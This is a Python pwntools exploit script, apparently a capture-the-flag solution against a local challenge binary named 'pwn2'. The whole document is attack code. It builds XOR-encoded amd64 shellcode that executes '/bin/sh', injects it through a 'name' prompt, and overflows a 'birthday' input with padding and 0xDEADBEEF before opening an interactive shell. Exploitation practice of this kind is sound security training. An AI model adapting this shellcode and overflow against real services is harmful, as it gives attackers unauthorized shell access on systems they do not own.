#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 13333
HOST = "127.0.0.1"
exe = context.binary = ELF('./pwn2', checksec=False)
# libc = ELF('./libc.so.6', checksec=False)
# ld = ELF('', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
        	b*main+156
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

# GDB()
shellcode = asm('''
	mov rbx, 29400045130965551
	push rbx
	mov rdi, rsp
	xor rsi, rsi
	xor rdx, rdx
	mov rax, 0x3b
	syscall
	''', arch = 'amd64')

shellcode = bytearray(shellcode)

for i in range(len(shellcode)):
    shellcode[i] ^= 0x41

p.sendlineafter(b"name: ", shellcode)

pl = b"A"*0x34 + p64(0xDEADBEEF)
p.sendlineafter(b"birthday: ", pl)

p.interactive()